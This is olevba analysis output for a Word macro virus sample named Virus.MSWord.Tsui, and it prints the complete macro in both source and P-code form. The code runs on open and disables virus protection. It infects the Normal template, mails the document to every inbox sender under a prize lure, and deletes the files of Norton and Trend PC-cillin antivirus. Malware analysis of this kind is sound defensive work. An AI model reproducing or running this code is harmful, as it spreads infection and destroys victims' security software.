olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tsui
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tsui - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'³o¬O¤@°¦¥Î¨Ó¬ã¨s¥Îªºµ{¦¡,°ò¥»¤W¤£·|³y¦¨¥ô¦ó¹q¸£ªº¶Ë®`
'§Æ±æ¯à´£¨Ñµ¹¦³¿³½ì¬ã¨s¥¨¶°µ{¦¡ªº¤H
'§Ú¤£¹ªÀy±z§ó§ï³o­Óµ{¦¡
'¥H§K³y¦¨¥L¤H¶Ë®`
'§Þ³N:ÁÍ¶Õ¬ì§Þ´£¨Ñ(¬ö©s§»¥ý¥Í¤j§@¥¨¶°¯f¬r§¹¥þ¯}¸Ñ¤â¥U),·L³n¤ä´©(¦UÃþvba¤â¥U)
'§@ªÌ:®çªá®q¥D
On Error Resume Next
Options.VirusProtection = Chr(48): Options.SaveNormalPrompt = Chr(48): Options.ConfirmConversions = Chr(48)
havevir = 0
doc = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines
nor = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
If nor > Abs(havevir) And doc > Abs(havevir) Then GoTo tsuicy
If nor = Abs(havevir) Then
    Set norset = NormalTemplate.VBProject.VBComponents
    Set docset = ActiveDocument.VBProject.VBComponents
    docset.Item(1).Name = norset.Item(1).Name
    docset.Item(1).Export Windows.Application.Path & ".dll"
End If
If doc = Abs(havevir) Then Set norset = ActiveDocument.VBProject.VBComponents
norset.Item(1).codemodule.AddFromFile Windows.Application.Path & ".dll"
With norset.Item(1).codemodule
   For j = Chr(49) To Chr(52)
   .deletelines 1
   Next j
    End With
If nor = Abs(havevir) And doc = Abs(havevir) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
tsuicy:
If nor <> Abs(havevir) And doc = Abs(havevir) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If Tasks.Exists("Microsoft Outlook") = True Then
'MsgBox "outlook is running"
Set myoutapp = CreateObject("outlook.application")
Set mynamespace = myoutapp.getnamespace("MAPI")
Set myinboxfolder = mynamespace.getdefaultfolder(6)
Set myitems = myinboxfolder.items
For j = 1 To myitems.Count
 Set myitem = myitems(j)
 Set newitem = myoutapp.createitem(0)
 newitem.Subject = "³Ì¨üÅwªï¥D¼½°Ý¨é½Õ¬d"
 newitem.body = "½Ð¶ñ§´°Ý¨éE-MAIL¦^tvbs·s»D³¡,§Ú­Ì±N°e±zNOKIA 8810¤â¾÷¤@°¦"
 newitem.To = myitem.SenderName
 newitem.attachments.Add ActiveDocument.FullName
 'newitem.Display
 newitem.send
 Next
 
 Set new1item = myoutapp.createitem(0)
 new1item.Subject = "§Ú¥þ¤O¤ä«ù½±¶®²N"
 new1item.body = "¥þ¥xÆW³ÌÀuªº¥D¼½´N¬O©p°Õ.......§Ú¤ä«ù©p"
 new1item.To = "vivian_chiang@mail.ftv.com.tw"
 new1item.send
 
End If
If Day(Now) = 30 And Month(Now) = 6 Then
 MsgBox "±Z§g¿Phappy birthday"
End If

Dim str1file As String
str1file = Dir("c:\program files\", vbDirectory)
Do Until str1file = ""
If str1file = "Norton AntiVirus" Then
str2 = "c:\program files\" & str1file
'MsgBox "norton is found"
With Application.FileSearch
 .LookIn = str2
 .SearchSubFolders = False
 .FileName = "*.*"
 If .Execute() > 0 Then
 For i = 1 To .FoundFiles.Count
 Kill .FoundFiles(i)
 Next i
End If
End With
End If
str1file = Dir
Loop

Dim pcfile As String
pcfile = Dir("c:\program files\", vbDirectory)
Do Until pcfile = ""
pcdir = Left(pcfile, 10)
If pcdir = "Trend PC-c" Then
pcstr2 = "c:\program files\" & pcfile
'MsgBox "pc-cllin is found"
With Application.FileSearch
 .LookIn = pcstr2
 .SearchSubFolders = False
 .FileName = "*.*"
 If .Execute() > 0 Then
 For i = 1 To .FoundFiles.Count
 Kill .FoundFiles(i)
 Next i
End If
End With
End If
'MsgBox str1file
pcfile = Dir
Loop
lo:
With Assistant.NewBalloon
.Heading = "³Ì¨üÅwªï¥D¼½°Ý¨é"
.Text = "­þ¤@¦ì¬O¥xÆW³ÌÄêªº¹qµø¥D¼½?"
.Checkboxes(1).Text = "§õ¥|ºÝ"
.Checkboxes(2).Text = "¨H¬KµØ"
.Checkboxes(3).Text = "À¹©¾¤¯"
.Checkboxes(4).Text = "±i¶®µ^"
.Checkboxes(5).Text = "½±¶®²N"
.Button = msoButtonSetOK
.Show

Select Case True
Case .Checkboxes(1).Checked
MsgBox "¥L¤£ºâÄê,ÁÙ®¼¦³½s¿è¯à¤O": GoTo lo
Case .Checkboxes(2).Checked
MsgBox "¦oÁöµMÄê,«o«D³ÌÄê,­Ë¼Æ²Ä¤G¦Ó¤w": GoTo lo
Case .Checkboxes(3).Checked
MsgBox "Áö±`¦YÁ³µ·,¥u¬O´¶³qÄê": GoTo lo
Case .Checkboxes(4).Checked
MsgBox "¨S¿ù!¥þ¥xÆW³ÌÄêªº¹qµø¥D¼½´N¬O¦o-±i¶®µ^"
Case .Checkboxes(5).Checked
MsgBox "§ÚªY½àªº¥D¼½,¦³¤~®ð,¤£¿ù®@": GoTo lo
Case Else
GoTo lo
End Select
Select Case False
End Select
End With


End Sub



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Tsui
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7707 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	QuoteRem 0x0000 0x0035 "³o¬O¤@°¦¥Î¨Ó¬ã¨s¥Îªºµ{¦¡,°ò¥»¤W¤£·|³y¦¨¥ô¦ó¹q¸£ªº¶Ë®`"
' Line #2:
' 	QuoteRem 0x0000 0x0022 "§Æ±æ¯à´£¨Ñµ¹¦³¿³½ì¬ã¨s¥¨¶°µ{¦¡ªº¤H"
' Line #3:
' 	QuoteRem 0x0000 0x0016 "§Ú¤£¹ªÀy±z§ó§ï³o­Óµ{¦¡"
' Line #4:
' 	QuoteRem 0x0000 0x0010 "¥H§K³y¦¨¥L¤H¶Ë®`"
' Line #5:
' 	QuoteRem 0x0000 0x004B "§Þ³N:ÁÍ¶Õ¬ì§Þ´£¨Ñ(¬ö©s§»¥ý¥Í¤j§@¥¨¶°¯f¬r§¹¥þ¯}¸Ñ¤â¥U),·L³n¤ä´©(¦UÃþvba¤â¥U)"
' Line #6:
' 	QuoteRem 0x0000 0x000D "§@ªÌ:®çªá®q¥D"
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' 	LitDI2 0x0000 
' 	St havevir 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St doc 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St nor 
' Line #12:
' 	Ld nor 
' 	Ld havevir 
' 	FnAbs 
' 	Gt 
' 	Ld doc 
' 	Ld havevir 
' 	FnAbs 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo tsuicy 
' 	EndIf 
' Line #13:
' 	Ld nor 
' 	Ld havevir 
' 	FnAbs 
' 	Eq 
' 	IfBlock 
' Line #14:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set norset 
' Line #15:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set docset 
' Line #16:
' 	LitDI2 0x0001 
' 	Ld norset 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld docset 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #17:
' 	Ld Windows 
' 	MemLd Application 
' 	MemLd Path 
' 	LitStr 0x0004 ".dll"
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld docset 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	Ld doc 
' 	Ld havevir 
' 	FnAbs 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set norset 
' 	EndIf 
' Line #20:
' 	Ld Windows 
' 	MemLd Application 
' 	MemLd Path 
' 	LitStr 0x0004 ".dll"
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld norset 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #21:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld norset 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #22:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0034 
' 	ArgsLd Chr 0x0001 
' 	For 
' Line #23:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #24:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	EndWith 
' Line #26:
' 	Ld nor 
' 	Ld havevir 
' 	FnAbs 
' 	Eq 
' 	Ld doc 
' 	Ld havevir 
' 	FnAbs 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #27:
' 	Label tsuicy 
' Line #28:
' 	Ld nor 
' 	Ld havevir 
' 	FnAbs 
' 	Ne 
' 	Ld doc 
' 	Ld havevir 
' 	FnAbs 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #29:
' 	LitStr 0x0011 "Microsoft Outlook"
' 	Ld Tasks 
' 	ArgsMemLd Exists 0x0001 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #30:
' 	QuoteRem 0x0000 0x001B "MsgBox "outlook is running""
' Line #31:
' 	SetStmt 
' 	LitStr 0x0013 "outlook.application"
' 	ArgsLd CreateObject 0x0001 
' 	Set myoutapp 
' Line #32:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld myoutapp 
' 	ArgsMemLd getnamespace 0x0001 
' 	Set mynamespace 
' Line #33:
' 	SetStmt 
' 	LitDI2 0x0006 
' 	Ld mynamespace 
' 	ArgsMemLd getdefaultfolder 0x0001 
' 	Set myinboxfolder 
' Line #34:
' 	SetStmt 
' 	Ld myinboxfolder 
' 	MemLd items 
' 	Set myitems 
' Line #35:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld myitems 
' 	MemLd Count 
' 	For 
' Line #36:
' 	SetStmt 
' 	Ld j 
' 	ArgsLd myitems 0x0001 
' 	Set myitem 
' Line #37:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld myoutapp 
' 	ArgsMemLd createitem 0x0001 
' 	Set newitem 
' Line #38:
' 	LitStr 0x0014 "³Ì¨üÅwªï¥D¼½°Ý¨é½Õ¬d"
' 	Ld newitem 
' 	MemSt Subject 
' Line #39:
' 	LitStr 0x0039 "½Ð¶ñ§´°Ý¨éE-MAIL¦^tvbs·s»D³¡,§Ú­Ì±N°e±zNOKIA 8810¤â¾÷¤@°¦"
' 	Ld newitem 
' 	MemSt body 
' Line #40:
' 	Ld myitem 
' 	MemLd SenderName 
' 	Ld newitem 
' 	MemSt True 
' Line #41:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld newitem 
' 	MemLd attachments 
' 	ArgsMemCall Add 0x0001 
' Line #42:
' 	QuoteRem 0x0001 0x000F "newitem.Display"
' Line #43:
' 	Ld newitem 
' 	ArgsMemCall send 0x0000 
' Line #44:
' 	StartForVariable 
' 	Next 
' Line #45:
' Line #46:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld myoutapp 
' 	ArgsMemLd createitem 0x0001 
' 	Set new1item 
' Line #47:
' 	LitStr 0x0010 "§Ú¥þ¤O¤ä«ù½±¶®²N"
' 	Ld new1item 
' 	MemSt Subject 
' Line #48:
' 	LitStr 0x0027 "¥þ¥xÆW³ÌÀuªº¥D¼½´N¬O©p°Õ.......§Ú¤ä«ù©p"
' 	Ld new1item 
' 	MemSt body 
' Line #49:
' 	LitStr 0x001D "vivian_chiang@mail.ftv.com.tw"
' 	Ld new1item 
' 	MemSt True 
' Line #50:
' 	Ld new1item 
' 	ArgsMemCall send 0x0000 
' Line #51:
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001E 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #54:
' 	LitStr 0x0014 "±Z§g¿Phappy birthday"
' 	ArgsCall MsgBox 0x0001 
' Line #55:
' 	EndIfBlock 
' Line #56:
' Line #57:
' 	Dim 
' 	VarDefn str1file (As String)
' Line #58:
' 	LitStr 0x0011 "c:\program files\"
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	St str1file 
' Line #59:
' 	Ld str1file 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoUnitil 
' Line #60:
' 	Ld str1file 
' 	LitStr 0x0010 "Norton AntiVirus"
' 	Eq 
' 	IfBlock 
' Line #61:
' 	LitStr 0x0011 "c:\program files\"
' 	Ld str1file 
' 	Concat 
' 	St str2 
' Line #62:
' 	QuoteRem 0x0000 0x0018 "MsgBox "norton is found""
' Line #63:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #64:
' 	Ld str2 
' 	MemStWith LookIn 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith SearchSubFolders 
' Line #66:
' 	LitStr 0x0003 "*.*"
' 	MemStWith FileName 
' Line #67:
' 	ArgsMemLdWith Execute 0x0000 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #68:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #69:
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #70:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	EndWith 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	Ld Dir 
' 	St str1file 
' Line #75:
' 	Loop 
' Line #76:
' Line #77:
' 	Dim 
' 	VarDefn pcfile (As String)
' Line #78:
' 	LitStr 0x0011 "c:\program files\"
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	St pcfile 
' Line #79:
' 	Ld pcfile 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoUnitil 
' Line #80:
' 	Ld pcfile 
' 	LitDI2 0x000A 
' 	ArgsLd LBound 0x0002 
' 	St pcdir 
' Line #81:
' 	Ld pcdir 
' 	LitStr 0x000A "Trend PC-c"
' 	Eq 
' 	IfBlock 
' Line #82:
' 	LitStr 0x0011 "c:\program files\"
' 	Ld pcfile 
' 	Concat 
' 	St pcstr2 
' Line #83:
' 	QuoteRem 0x0000 0x001A "MsgBox "pc-cllin is found""
' Line #84:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #85:
' 	Ld pcstr2 
' 	MemStWith LookIn 
' Line #86:
' 	LitVarSpecial (False)
' 	MemStWith SearchSubFolders 
' Line #87:
' 	LitStr 0x0003 "*.*"
' 	MemStWith FileName 
' Line #88:
' 	ArgsMemLdWith Execute 0x0000 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #89:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #90:
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #91:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	EndWith 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	QuoteRem 0x0000 0x000F "MsgBox str1file"
' Line #96:
' 	Ld Dir 
' 	St pcfile 
' Line #97:
' 	Loop 
' Line #98:
' 	Label lo 
' Line #99:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #100:
' 	LitStr 0x0010 "³Ì¨üÅwªï¥D¼½°Ý¨é"
' 	MemStWith Heading 
' Line #101:
' 	LitStr 0x001B "­þ¤@¦ì¬O¥xÆW³ÌÄêªº¹qµø¥D¼½?"
' 	MemStWith Then 
' Line #102:
' 	LitStr 0x0006 "§õ¥|ºÝ"
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Checkboxes 0x0001 
' 	MemSt Then 
' Line #103:
' 	LitStr 0x0006 "¨H¬KµØ"
' 	LitDI2 0x0002 
' 	ArgsMemLdWith Checkboxes 0x0001 
' 	MemSt Then 
' Line #104:
' 	LitStr 0x0006 "À¹©¾¤¯"
' 	LitDI2 0x0003 
' 	ArgsMemLdWith Checkboxes 0x0001 
' 	MemSt Then 
' Line #105:
' 	LitStr 0x0006 "±i¶®µ^"
' 	LitDI2 0x0004 
' 	ArgsMemLdWith Checkboxes 0x0001 
' 	MemSt Then 
' Line #106:
' 	LitStr 0x0006 "½±¶®²N"
' 	LitDI2 0x0005 
' 	ArgsMemLdWith Checkboxes 0x0001 
' 	MemSt Then 
' Line #107:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #108:
' 	ArgsMemCallWith Show 0x0000 
' Line #109:
' Line #110:
' 	LitVarSpecial (True)
' 	SelectCase 
' Line #111:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Checkboxes 0x0001 
' 	MemLd Checked 
' 	Case 
' 	CaseDone 
' Line #112:
' 	LitStr 0x0017 "¥L¤£ºâÄê,ÁÙ®¼¦³½s¿è¯à¤O"
' 	ArgsCall MsgBox 0x0001 
' 	BoS 0x0000 
' 	GoTo lo 
' Line #113:
' 	LitDI2 0x0002 
' 	ArgsMemLdWith Checkboxes 0x0001 
' 	MemLd Checked 
' 	Case 
' 	CaseDone 
' Line #114:
' 	LitStr 0x001E "¦oÁöµMÄê,«o«D³ÌÄê,­Ë¼Æ²Ä¤G¦Ó¤w"
' 	ArgsCall MsgBox 0x0001 
' 	BoS 0x0000 
' 	GoTo lo 
' Line #115:
' 	LitDI2 0x0003 
' 	ArgsMemLdWith Checkboxes 0x0001 
' 	MemLd Checked 
' 	Case 
' 	CaseDone 
' Line #116:
' 	LitStr 0x0015 "Áö±`¦YÁ³µ·,¥u¬O´¶³qÄê"
' 	ArgsCall MsgBox 0x0001 
' 	BoS 0x0000 
' 	GoTo lo 
' Line #117:
' 	LitDI2 0x0004 
' 	ArgsMemLdWith Checkboxes 0x0001 
' 	MemLd Checked 
' 	Case 
' 	CaseDone 
' Line #118:
' 	LitStr 0x0026 "¨S¿ù!¥þ¥xÆW³ÌÄêªº¹qµø¥D¼½´N¬O¦o-±i¶®µ^"
' 	ArgsCall MsgBox 0x0001 
' Line #119:
' 	LitDI2 0x0005 
' 	ArgsMemLdWith Checkboxes 0x0001 
' 	MemLd Checked 
' 	Case 
' 	CaseDone 
' Line #120:
' 	LitStr 0x001A "§ÚªY½àªº¥D¼½,¦³¤~®ð,¤£¿ù®@"
' 	ArgsCall MsgBox 0x0001 
' 	BoS 0x0000 
' 	GoTo lo 
' Line #121:
' 	CaseElse 
' Line #122:
' 	GoTo lo 
' Line #123:
' 	EndSelect 
' Line #124:
' 	LitVarSpecial (False)
' 	SelectCase 
' Line #125:
' 	EndSelect 
' Line #126:
' 	EndWith 
' Line #127:
' Line #128:
' Line #129:
' 	EndSub 
' Line #130:
' Line #131:
' Line #132:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

